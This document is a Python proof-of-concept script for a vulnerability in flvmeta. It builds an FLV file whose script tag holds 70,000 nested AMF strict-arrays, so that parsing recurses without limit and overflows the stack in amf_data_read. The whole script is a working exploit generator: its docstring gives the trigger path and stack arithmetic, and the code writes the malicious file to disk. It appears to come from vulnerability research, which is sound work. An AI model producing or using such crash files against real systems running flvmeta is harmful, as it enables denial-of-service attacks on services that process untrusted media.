#!/usr/bin/env python3
"""
PoC generator for flvmeta VULN-001:
Stack overflow via unbounded recursion in AMF parsing (amf_data_read).

Trigger path:
  flvmeta main() -> flv_parse() -> flv_read_metadata() -> amf_data_file_read()
    -> amf_data_read() -> amf_array_read() -> (loop) -> amf_data_read()
    -> amf_array_read() -> ... [unbounded mutual recursion]

Strategy: Build a FLV file whose script tag contains a deeply nested
AMF strict-array (type 0x0A, count=1), 70000 levels deep. Each recursive
call to amf_data_read() -> amf_array_read() consumes ~100-150 bytes of
stack. With an 8MB default stack this overflows at roughly 55k-83k levels.
"""

import struct
import sys
import os

DEPTH = 70000
OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.flv")


def build_amf_payload(depth: int) -> bytes:
    """Build deeply nested AMF strict-array payload followed by a leaf number."""
    # AMF string "onMetaData": type 0x02 + 2-byte length + UTF-8 bytes
    name = b"onMetaData"
    amf_name = b"\x02" + struct.pack(">H", len(name)) + name

    # Nested strict-arrays: each level = 0x0A + uint32_BE(1)
    nested = b"\x0a" + struct.pack(">I", 1)
    arrays = nested * depth

    # Leaf: AMF number 0.0 (type 0x00 + 8-byte IEEE-754 double = 0.0)
    leaf = b"\x00" + b"\x00" * 8

    return amf_name + arrays + leaf


def build_flv(payload: bytes) -> bytes:
    """Wrap the AMF payload in a valid FLV file."""
    # FLV header: signature + version(1) + flags(5=audio+video) + header_size(9)
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size (always 0 at start)
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag header:
    #   type       = 0x12 (script data)
    #   data_size  = 3 bytes BE
    #   timestamp  = 3 bytes BE (0)
    #   ts_ext     = 1 byte (0)
    #   stream_id  = 3 bytes (0)
    tag_type = b"\x12"
    data_size = len(payload)
    tag_data_size = struct.pack(">I", data_size)[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    ts_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    script_tag = tag_type + tag_data_size + timestamp + ts_ext + stream_id + payload

    # Previous tag size after script tag = 11 (tag header) + data_size
    prev_tag_size_1 = struct.pack(">I", 11 + data_size)

    return flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1


def main():
    out_path = OUTPUT
    if len(sys.argv) > 1:
        out_path = sys.argv[1]

    print(f"[*] Building AMF payload with {DEPTH} nested strict-arrays...")
    payload = build_amf_payload(DEPTH)
    print(f"[*] AMF payload size: {len(payload)} bytes")

    flv_data = build_flv(payload)
    print(f"[*] Total FLV size: {len(flv_data)} bytes")

    with open(out_path, "wb") as f:
        f.write(flv_data)
    print(f"[+] Written to: {out_path}")


if __name__ == "__main__":
    main()
